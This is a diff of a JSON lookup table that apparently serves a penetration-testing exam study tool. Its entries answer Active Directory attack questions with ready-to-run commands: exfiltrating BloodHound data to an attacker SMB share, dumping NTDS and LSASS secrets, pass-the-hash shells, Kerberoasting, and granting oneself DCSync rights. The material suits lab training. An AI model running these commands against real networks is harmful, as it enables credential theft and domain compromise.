@@ -1,7 +1,14 @@
 [
   {
     "slug": "bloodhound-collect",
-    "triggers": ["bloodhound collect", "sharphound", "collect bloodhound", "bloodhound python", "run bloodhound", "bloodhound collection"],
+    "triggers": [
+      "bloodhound collect",
+      "sharphound",
+      "collect bloodhound",
+      "bloodhound python",
+      "run bloodhound",
+      "bloodhound collection"
+    ],
     "title": "BloodHound collection (SharpHound + impacket-smbserver)",
     "answer_type": "inline",
     "inline_answer": "Use **SharpHound on-host + exfil over impacket-smbserver**. `bloodhound-python` is unreliable here (DNS SRV timeouts vs lab DCs) — do not rely on it.\n\n```\n# Kali: serve a writable share\nimpacket-smbserver share ./loot -smb2support -user a -password a\n# Target (after foothold):\nSharpHound.exe -c All --zipfilename bh\nnet use \\\\KALI_IP\\share /user:a a && copy bh*.zip \\\\KALI_IP\\share\\\n```\n\nNo foothold yet but have creds? `nxc ldap DC -u U -p P --bloodhound -c All --dns-server DC_IP`.",
@@ -11,7 +18,14 @@
   },
   {
     "slug": "secretsdump-syntax",
-    "triggers": ["secretsdump", "impacket secretsdump", "dump ntds", "dump domain hashes", "secretsdump dc", "ntds dump"],
+    "triggers": [
+      "secretsdump",
+      "impacket secretsdump",
+      "dump ntds",
+      "dump domain hashes",
+      "secretsdump dc",
+      "ntds dump"
+    ],
     "title": "impacket-secretsdump — syntax",
     "answer_type": "inline",
     "inline_answer": "```\n# With password\nimpacket-secretsdump 'DOMAIN/user:Password@DC_IP'\n# Pass-the-Hash\nimpacket-secretsdump -hashes :NTHASH 'DOMAIN/user@TARGET_IP'\n# DCSync only (needs replication rights / DA)\nimpacket-secretsdump -just-dc 'DOMAIN/user:Password@DC_IP'\n```\n\nFeed the resulting `user:rid:LM:NT:::` NT field to `hashcat -m 1000`, or PtH it directly.",
@@ -21,7 +35,15 @@
   },
   {
     "slug": "pass-the-hash-syntax",
-    "triggers": ["pass the hash", "pth syntax", "nxc hash", "evil-winrm hash", "-H ntlm", "psexec hash", "login with hash"],
+    "triggers": [
+      "pass the hash",
+      "pth syntax",
+      "nxc hash",
+      "evil-winrm hash",
+      "-H ntlm",
+      "psexec hash",
+      "login with hash"
+    ],
     "title": "Pass-the-Hash — the three you actually use",
     "answer_type": "inline",
     "inline_answer": "Use the **NT** half only (`aad3b...:NT` → `NT`).\n\n```\nnxc smb TARGET -u user -H NTHASH                 # validate + spray\nevil-winrm -i TARGET -u user -H NTHASH            # shell (WinRM)\nimpacket-psexec -hashes :NTHASH 'DOMAIN/user@TARGET'   # SYSTEM shell (SMB admin)\n```\n\n`(Pwn3d!)` from nxc = local admin → psexec/wmiexec. Then secretsdump that host.",
@@ -31,7 +53,14 @@
   },
   {
     "slug": "kerberoast-how-to",
-    "triggers": ["kerberoast command", "getuserspns", "how to kerberoast", "kerberoast", "request spn", "kerberoasting"],
+    "triggers": [
+      "kerberoast command",
+      "getuserspns",
+      "how to kerberoast",
+      "kerberoast",
+      "request spn",
+      "kerberoasting"
+    ],
     "title": "Kerberoast — request the TGS",
     "answer_type": "inline",
     "inline_answer": "Needs any domain creds.\n\n```\nimpacket-GetUserSPNs 'DOMAIN/user:Password' -dc-ip DC_IP -request -outputfile kerb.txt\n# or, no creds yet but a user list (no-preauth not needed here):\nnxc ldap DC_IP -u user -p Password --kerberoasting kerb.txt\n```\n\nCrack: `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule`. Hash = `$krb5tgs$23$`.",
@@ -41,7 +70,14 @@
   },
   {
     "slug": "asrep-how-to",
-    "triggers": ["asrep command", "getnpusers", "how to asrep", "asreproast", "as-rep roast", "no preauth users"],
+    "triggers": [
+      "asrep command",
+      "getnpusers",
+      "how to asrep",
+      "asreproast",
+      "as-rep roast",
+      "no preauth users"
+    ],
     "title": "AS-REP roast — request the AS-REP",
     "answer_type": "inline",
     "inline_answer": "Targets users with **Do not require Kerberos preauth**. No creds needed if you have a user list.\n\n```\nimpacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat\n# with creds (enumerate the flag, then request):\nimpacket-GetNPUsers 'DOMAIN/user:Password' -dc-ip DC_IP -request\n```\n\nCrack: `hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`. Hash = `$krb5asrep$23$`.",
@@ -51,7 +87,15 @@
   },
   {
     "slug": "nxc-ad-quickwins",
-    "triggers": ["nxc modules", "netexec ad", "nxc one liners", "nxc smb commands", "nxc ldap", "crackmapexec ad", "nxc enum"],
+    "triggers": [
+      "nxc modules",
+      "netexec ad",
+      "nxc one liners",
+      "nxc smb commands",
+      "nxc ldap",
+      "crackmapexec ad",
+      "nxc enum"
+    ],
     "title": "nxc — AD quick wins",
     "answer_type": "inline",
     "inline_answer": "```\nnxc smb  DC -u U -p P --pass-pol --users --groups\nnxc smb  RANGE -u U -p P --shares                 # then --spider_plus\nnxc smb  RANGE -u U -p P -M lsassy                # dump LSASS where admin\nnxc smb  HOST -u U -p P --sam --lsa               # local secrets\nnxc ldap DC -u U -p P --kerberoasting k.txt --asreproast a.txt\nnxc ldap DC -u U -p P --bloodhound -c All --dns-server DC\n```\n\nNever `crackmapexec`/`cme` — `nxc` only.",
@@ -61,7 +105,13 @@
   },
   {
     "slug": "forcechangepassword-abuse",
-    "triggers": ["forcechangepassword", "force change password", "reset user password", "bloodhound reset password", "change target password"],
+    "triggers": [
+      "forcechangepassword",
+      "force change password",
+      "reset user password",
+      "bloodhound reset password",
+      "change target password"
+    ],
     "title": "Abuse ForceChangePassword",
     "answer_type": "inline",
     "inline_answer": "You can reset the target user's password without knowing the old one.\n\n```\nnet rpc password \"TARGETUSER\" \"NewP@ss123\" -U \"DOMAIN\"/\"YOU\"%\"YOURPASS\" -S DC_IP\n# or from Windows: Set-DomainUserPassword -Identity TARGETUSER -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)\n```\n\nThen treat `TARGETUSER:NewP@ss123` as a fresh cred → spray everywhere.",
@@ -71,7 +121,14 @@
   },
   {
     "slug": "genericall-abuse",
-    "triggers": ["genericall", "genericwrite", "targeted kerberoast", "add spn", "write spn abuse", "generic all user"],
+    "triggers": [
+      "genericall",
+      "genericwrite",
+      "targeted kerberoast",
+      "add spn",
+      "write spn abuse",
+      "generic all user"
+    ],
     "title": "Abuse GenericAll / GenericWrite on a user",
     "answer_type": "inline",
     "inline_answer": "GenericAll/Write on a **user** → targeted Kerberoast (set an SPN, roast, remove it):\n\n```\nimpacket-targetedKerberoast.py -d DOMAIN -u YOU -p PASS    # auto add/roast/cleanup\n# or set SPN manually then GetUserSPNs the target\n```\n\nGenericAll on a **computer** → RBCD. On a **group** → add yourself as a member. Else just ForceChangePassword.",
@@ -81,7 +138,13 @@
   },
   {
     "slug": "writedacl-dcsync",
-    "triggers": ["writedacl", "grant dcsync", "dacl dcsync", "write dacl abuse", "give self replication"],
+    "triggers": [
+      "writedacl",
+      "grant dcsync",
+      "dacl dcsync",
+      "write dacl abuse",
+      "give self replication"
+    ],
     "title": "WriteDACL → grant self DCSync",
     "answer_type": "inline",
     "inline_answer": "WriteDACL on the **domain object** → grant yourself replication rights, then DCSync:\n\n```\nimpacket-dacledit -action write -rights DCSync -principal YOU -target-dn 'DC=domain,DC=com' 'DOMAIN/YOU:PASS'\nimpacket-secretsdump -just-dc 'DOMAIN/YOU:PASS@DC_IP'\n```\n\nFrom Windows: `Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity YOU -Rights DCSync`.",
@@ -91,7 +154,14 @@
   },
   {
     "slug": "ad-attack-chain",
-    "triggers": ["ad attack chain", "ad methodology", "active directory steps", "ad killchain", "how to do ad", "ad set"],
+    "triggers": [
+      "ad attack chain",
+      "ad methodology",
+      "active directory steps",
+      "ad killchain",
+      "how to do ad",
+      "ad set"
+    ],
     "title": "AD attack chain (methodology)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Active_Directory.md#ad-attack-chain",
@@ -100,16 +170,30 @@
   },
   {
     "slug": "ad-decision-tree",
-    "triggers": ["ad decision tree", "where to start ad", "ad mental model", "ad stuck", "ad next step", "5 step ad"],
+    "triggers": [
+      "ad decision tree",
+      "where to start ad",
+      "ad mental model",
+      "ad stuck",
+      "ad next step",
+      "5 step ad"
+    ],
     "title": "The 5-step AD decision tree",
     "answer_type": "chunk_ref",
-    "target_chunk_id": "BUS_REVIEW/OffSec_AD_Mental_Model.md#the-5-step-ad-decision-tree",
+    "target_chunk_id": null,
     "tags": "ad methodology decision",
     "priority": 185
   },
   {
     "slug": "bloodhound-edges",
-    "triggers": ["bloodhound edge", "what does this edge mean", "abuse edge", "bloodhound abuse", "edge interpretation", "outbound object control"],
+    "triggers": [
+      "bloodhound edge",
+      "what does this edge mean",
+      "abuse edge",
+      "bloodhound abuse",
+      "edge interpretation",
+      "outbound object control"
+    ],
     "title": "BloodHound edge interpretation cheatsheet",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#5-3-edge-interpretation-cheatsheet",
@@ -118,7 +202,13 @@
   },
   {
     "slug": "hash-now-what-ad",
-    "triggers": ["i have a hash now what", "ntlm hash now what", "hash decision ad", "got an nt hash", "what to do with hash"],
+    "triggers": [
+      "i have a hash now what",
+      "ntlm hash now what",
+      "hash decision ad",
+      "got an nt hash",
+      "what to do with hash"
+    ],
     "title": "I have a hash — now what? (AD decision tree)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Active_Directory_PtH_PtT.md#decision-tree-i-have-a-hash-now-what",
@@ -127,7 +217,15 @@
   },
   {
     "slug": "coerce-relay",
-    "triggers": ["coerce relay", "petitpotam", "printerbug", "coerced auth", "relay to dc", "ntlmrelayx dc", "the offsec gimme"],
+    "triggers": [
+      "coerce relay",
+      "petitpotam",
+      "printerbug",
+      "coerced auth",
+      "relay to dc",
+      "ntlmrelayx dc",
+      "the offsec gimme"
+    ],
     "title": "Coerced auth + relay (the OffSec gimme)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#9-5-coerced-auth-relay-the-offsec-gimme",
@@ -136,7 +234,13 @@
   },
   {
     "slug": "dcsync-attack",
-    "triggers": ["dcsync", "replicate directory", "secretsdump just-dc", "domain hashes dump", "krbtgt dump"],
+    "triggers": [
+      "dcsync",
+      "replicate directory",
+      "secretsdump just-dc",
+      "domain hashes dump",
+      "krbtgt dump"
+    ],
     "title": "DCSync",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Active_Directory_PtH_PtT.md#dcsync",
@@ -145,7 +249,13 @@
   },
   {
     "slug": "rbcd-abuse",
-    "triggers": ["rbcd", "resource based constrained delegation", "allowed to act on behalf", "rbcd attack", "machine account abuse"],
+    "triggers": [
+      "rbcd",
+      "resource based constrained delegation",
+      "allowed to act on behalf",
+      "rbcd attack",
+      "machine account abuse"
+    ],
     "title": "RBCD (Resource-Based Constrained Delegation) abuse",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#6-5-rbcd-resource-based-constrained-delegation",
@@ -154,7 +264,15 @@
   },
   {
     "slug": "adcs-abuse",
-    "triggers": ["adcs", "certipy", "esc1", "certificate abuse", "ad cs", "certificate services", "esc8"],
+    "triggers": [
+      "adcs",
+      "certipy",
+      "esc1",
+      "certificate abuse",
+      "ad cs",
+      "certificate services",
+      "esc8"
+    ],
     "title": "ADCS (Certificate Services) abuse",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#9-4-adcs-certificate-services-abuse",
@@ -163,7 +281,13 @@
   },
   {
     "slug": "stuck-on-da",
-    "triggers": ["stuck on da", "cant reach dc", "second machine no dc", "stuck domain admin", "have machine no dc"],
+    "triggers": [
+      "stuck on da",
+      "cant reach dc",
+      "second machine no dc",
+      "stuck domain admin",
+      "have machine no dc"
+    ],
     "title": "Stuck on DA — have a second machine, can't reach DC",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#11-3-stuck-on-da-have-second-machine-can-t-reach-dc",
@@ -172,7 +296,12 @@
   },
   {
     "slug": "unconstrained-delegation",
-    "triggers": ["unconstrained delegation", "tgt delegation", "printerbug unconstrained", "delegation abuse"],
+    "triggers": [
+      "unconstrained delegation",
+      "tgt delegation",
+      "printerbug unconstrained",
+      "delegation abuse"
+    ],
     "title": "Unconstrained delegation abuse",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#9-3-unconstrained-delegation-abuse",
@@ -181,7 +310,13 @@
   },
   {
     "slug": "laps-read",
-    "triggers": ["laps", "read laps password", "ms-mcs-admpwd", "laps dump", "laps reader"],
+    "triggers": [
+      "laps",
+      "read laps password",
+      "ms-mcs-admpwd",
+      "laps dump",
+      "laps reader"
+    ],
     "title": "Read LAPS passwords",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#7-5-laps",
@@ -190,7 +325,13 @@
   },
   {
     "slug": "gmsa-read",
-    "triggers": ["gmsa", "read gmsa", "gmsapassword", "gmsadumper", "managed service account"],
+    "triggers": [
+      "gmsa",
+      "read gmsa",
+      "gmsapassword",
+      "gmsadumper",
+      "managed service account"
+    ],
     "title": "Read gMSA passwords",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Active_Directory_Checklist_Methodology.md#7-6-gmsa",
@@ -199,7 +340,14 @@
   },
   {
     "slug": "powerview-domain-trust",
-    "triggers": ["get-domaintrust", "domain trust", "domain trusts", "enum domain trust", "get-netdomaintrust", "powerview trust"],
+    "triggers": [
+      "get-domaintrust",
+      "domain trust",
+      "domain trusts",
+      "enum domain trust",
+      "get-netdomaintrust",
+      "powerview trust"
+    ],
     "title": "PowerView — enumerate domain trusts",
     "answer_type": "inline",
     "inline_answer": "```powershell\nGet-DomainTrust            # PowerView v3 / PowerSploit dev (what the cheatsheet uses)\nGet-NetDomainTrust         # PowerView v2 / PowerSploit master (legacy alias — same output)\n```\n\nNo PowerView loaded? `nltest /domain_trusts` runs from any domain-joined host, no module needed.\n\n> [!note] PowerView's `Get-Net*` and `Get-Domain*` names refer to the same cmdlets in different branches — pick whichever your loaded module exposes.",
